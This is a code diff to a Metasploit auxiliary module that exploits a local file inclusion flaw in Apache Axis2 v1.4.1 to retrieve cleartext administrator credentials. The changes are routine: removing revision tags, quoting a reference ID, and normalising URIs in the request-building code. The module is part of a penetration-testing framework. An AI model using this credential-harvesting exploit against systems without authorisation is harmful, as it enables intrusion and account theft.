@@ -1,8 +1,4 @@
 ##
-# $Id$
-##
-
-##
 # This file is part of the Metasploit Framework and may be subject to
 # redistribution and commercial restrictions. Please see the Metasploit
 # web site for more information on licensing and terms of use.
@@ -21,7 +17,6 @@ class Metasploit3 < Msf::Auxiliary
 	def initialize
 		super(
 			'Name'           => 'Apache Axis2 v1.4.1 Local File Inclusion',
-			'Version'        => '$Revision$',
 			'Description'    => %q{
 					This module exploits an Apache Axis2 v1.4.1 local file inclusion (LFI) vulnerability.
 				By loading a local XML file which contains a cleartext username and password, attackers can trivially
@@ -29,7 +24,7 @@ class Metasploit3 < Msf::Auxiliary
 			},
 			'References'     =>
 				[
-					['EDB', 12721],
+					['EDB', '12721'],
 					['OSVDB', '59001'],
 				],
 			'Author'         =>
@@ -47,11 +42,12 @@ class Metasploit3 < Msf::Auxiliary
 	end
 
 	def target_url
-		"http://#{vhost}:#{rport}#{datastore['URI']}"
+		uri = normalize_uri(datastore['URI'])
+		"http://#{vhost}:#{rport}#{uri}"
 	end
 
 	def run_host(ip)
-		uri = datastore['URI']
+		uri = normalize_uri(datastore['URI'])
 
 		begin
 			res = send_request_raw({
@@ -62,7 +58,7 @@ class Metasploit3 < Msf::Auxiliary
 			if (res and res.code == 200)
 				extract_uri = res.body.to_s.match(/\/axis2\/services\/([^\s]+)\?/)
 				new_uri = "/axis2/services/#{$1}"
-
+				new_uri = normalize_uri(new_uri)
 				get_credentials(new_uri)
 
 			else
